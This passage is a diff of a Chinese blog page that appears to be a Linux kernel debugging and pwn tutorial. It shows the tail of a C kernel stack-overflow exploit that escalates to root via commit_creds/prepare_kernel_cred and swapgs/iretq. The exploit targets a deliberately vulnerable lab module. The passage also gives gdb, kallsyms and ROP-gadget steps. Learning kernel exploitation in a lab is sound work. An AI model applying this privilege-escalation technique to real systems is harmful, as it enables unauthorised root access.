class="keyword">void</span> <span class="title">payload</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	commit_creds( prepare_kernel_cred( <span class="number">0</span> ) );</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">&quot;mov $ff, %rsp;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;swapgs;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_ff</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">&quot;xorq %rax, %rax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movw %cs, %ax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movq %rax, ff+8;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;pushfq;   popq ff+16;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movw %ss, %ax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movq %rax, ff+32;\n&quot;</span>);</span><br><span class="line">	ff.rip	= &amp;shell;</span><br><span class="line">	ff.rsp	= ownstack + (STACK_SIZE / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE	*fd;</span><br><span class="line">	<span class="keyword">char</span>	buf[<span class="number">8</span> * <span class="number">6</span>];</span><br><span class="line">	<span class="built_in">memset</span>( buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">	*( (<span class="keyword">void</span> * *) (buf + <span class="number">8</span> * <span class="number">4</span>) ) = &amp;payload;</span><br><span class="line">	<span class="keyword">int</span>		ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	addr;</span><br><span class="line">	<span class="keyword">char</span>		dummy;</span><br><span class="line">	<span class="keyword">char</span>		sname[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* setup fake frame */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">&quot;[+] preparing fake frame&quot;</span> );</span><br><span class="line">	setup_ff();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* write payload */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">&quot;[+] writing payload to /proc/buggy&quot;</span> );</span><br><span class="line">	fd = fopen( <span class="string">&quot;/proc/buggy&quot;</span>, <span class="string">&quot;w&quot;</span> );</span><br><span class="line">	<span class="keyword">if</span> ( fd == <span class="literal">NULL</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		perror( <span class="string">&quot;fopen()&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite( buf, <span class="keyword">sizeof</span>(buf), <span class="number">1</span>, fd );</span><br><span class="line">	fclose( fd );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>编译完驱动和exploit后重新打包文件系统并启动Kernel。安装模块后，使用</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/modules/sbof/section/.text</span><br></pre></td></tr></table></figure>
+
 <p>查看模块代码段地址，并在gdb中</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> add-symbols-file sbof.ko &lt;内存位置&gt;</span></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> b &lt;内存位置&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>获取<code>commit_creds</code>和<code>prepare_kernel_cred</code>函数的内存地址：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep commit_creds /sys/kallsyms</span><br><span class="line">grep prepare_kernel_cred /sys/kallsyms</span><br></pre></td></tr></table></figure>
+
 <p>执行exploit之前最好切换到非root用户，执行exploit后获取root权限。</p>
 <h4 id="gadget搜索"><a href="#gadget搜索" class="headerlink" title="gadget搜索"></a>gadget搜索</h4><p>在性能良好的主机上使用Ropper：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure>
+
 <h3 id="Ubuntu-64位下编译32位程序"><a href="#Ubuntu-64位下编译32位程序" class="headerlink" title="Ubuntu 64位下编译32位程序"></a>Ubuntu 64位下编译32位程序</h3><h4 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make ARCH=i386</span><br></pre></td></tr></table></figure>
+
 <h4 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h4><p>修改编译选项</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(-m32 -march=i386) Additional CFLAGS</span><br><span class="line">(-m32) Additional LDFLAGS</span><br></pre></td></tr></table></figure>
-<h4 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> CFLAGS=<span class="string">"-m32"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(-m32 -march&#x3D;i386) Additional CFLAGS</span><br><span class="line">(-m32) Additional LDFLAGS</span><br></pre></td></tr></table></figure>
+
+<h4 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> CFLAGS=<span class="string">&quot;-m32&quot;</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="参考文章和资料"><a href="#参考文章和资料" class="headerlink" title="参考文章和资料"></a>参考文章和资料</h3><blockquote>
-<p><a href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu" target="_blank" rel="noopener">http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu</a></p>
-<p><a href="https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html</a></p>
-<p><a href="http://sec-redclub.com/archives/636/" target="_blank" rel="noopener">http://sec-redclub.com/archives/636/</a></p>
+<p><a target="_blank" rel="noopener" href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu">http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html">https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://sec-redclub.com/archives/636/">http://sec-redclub.com/archives/636/</a></p>
 <p>《奔跑吧，Linux内核 入门篇》</p>
 </blockquote>
 
-      
     </div>
 
     
-
     
-    
-    
-
-    
-
-    
-      
-    
-    
-
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/linux/" rel="tag"># linux</a>
-          
-            <a href="/tags/kernel/" rel="tag"># kernel</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/debug/" rel="tag"># debug</a>
-          
-        </div>
-      
-
-      
-      
-        <div class="post-widgets">
-        
-
-        
-
-        
-          
-          <div class="social_share">
-            
-            
-              <div id="needsharebutton-postbottom">
-                <span class="btn">
-                  <i class="fa fa-share-alt" aria-hidden="true"></i>
-                </span>
-              </div>
-            
-          </div>
-        
-        </div>
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/02/06/19-Feb/" rel="next" title="2019 Feb pwn writeup">
-                <i class="fa fa-chevron-left"></i> 2019 Feb pwn writeup
-              </a>
-            
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/linux/" rel="tag"># linux</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/debug/" rel="tag"># debug</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/11/Learn-LargeBin-With-Heapstorm2/" rel="prev" title="Learn Large Bin With 0ctf2018 Heapstorm2">
-                Learn Large Bin With 0ctf2018 Heapstorm2 <i class="fa fa-chevron-right"></i>
-              </a>
-            
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/02/06/19-Feb/" rel="prev" title="2019 Feb pwn writeup">
+                  <i class="fa fa-chevron-left"></i> 2019 Feb pwn writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/03/11/Learn-LargeBin-With-Heapstorm2/" rel="next" title="Learn Large Bin With 0ctf2018 Heapstorm2">
+                  Learn Large Bin With 0ctf2018 Heapstorm2 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
           </div>
-        </div>
-      
-
-      
-      
     </footer>
-  </div>
-  
-  
-  
   </article>
-
-
-  </div>
-
-
-          </div>
-          
-
+  
+  
   
 
 
 
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
       
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/avatar/avatar.jpeg"
-                alt="sunichi"/>
-            
-              <p class="site-author-name" itemprop="name">sunichi</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">46</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">54</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
-              
-            </div>
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用虚拟机源码调试Linux-Kernel"><span class="nav-number">1.</span> <span class="nav-text">使用虚拟机源码调试Linux Kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#虚拟机配置"><span class="nav-number">1.1.</span> <span class="nav-text">虚拟机配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QEMU-KVM环境配置"><span class="nav-number">1.2.</span> <span class="nav-text">QEMU/KVM环境配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在被调试机中编译和使用其他版本Linux内核"><span class="nav-number">1.3.</span> <span class="nav-text">在被调试机中编译和使用其他版本Linux内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#调试Linux内核"><span class="nav-number">1.4.</span> <span class="nav-text">调试Linux内核</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用QEMU源码调试Linux-Kernel"><span class="nav-number">2.</span> <span class="nav-text">使用QEMU源码调试Linux Kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#编译Linux内核"><span class="nav-number">2.1.</span> <span class="nav-text">编译Linux内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编译busybox"><span class="nav-number">2.2.</span> <span class="nav-text">编译busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成文件系统"><span class="nav-number">2.3.</span> <span class="nav-text">生成文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QEMU启动Linux-Kernel"><span class="nav-number">2.4.</span> <span class="nav-text">QEMU启动Linux Kernel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用deboostrap创建文件系统"><span class="nav-number">2.5.</span> <span class="nav-text">使用deboostrap创建文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GDB-Patch"><span class="nav-number">2.6.</span> <span class="nav-text">GDB Patch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编译特定内核版本的驱动"><span class="nav-number">2.7.</span> <span class="nav-text">编译特定内核版本的驱动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本内核栈溢出漏洞调试"><span class="nav-number">3.</span> <span class="nav-text">基本内核栈溢出漏洞调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单内核栈溢出示例"><span class="nav-number">3.1.</span> <span class="nav-text">简单内核栈溢出示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gadget搜索"><span class="nav-number">3.2.</span> <span class="nav-text">gadget搜索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu-64位下编译32位程序"><span class="nav-number">4.</span> <span class="nav-text">Ubuntu 64位下编译32位程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内核"><span class="nav-number">4.1.</span> <span class="nav-text">内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Busybox"><span class="nav-number">4.2.</span> <span class="nav-text">Busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#驱动"><span class="nav-number">4.3.</span> <span class="nav-text">驱动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章和资料"><span class="nav-number">5.</span> <span class="nav-text">参考文章和资料</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sunichi</span>
-
-  
-
-  
-</div>
-
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
 
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+    </div>
+  </main>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+  <footer class="footer">
+    <div class="footer-inner">
+      
 
       
 
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunichi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
 
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
+    </div>
+  </footer>
 
-                // show search results
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-                if (isMatch) {
-                  // sort index by position of keyword
+  
 
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
 
-                  // merge hits into slices
 
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
 
-                      // move to next position of hit
 
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
 
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
 
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
 
-                  // sort slices in content by search text's count and hits' count
 
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
 
-                  // select top N slices in content
 
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
 
-                  // highlight title and content
 
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
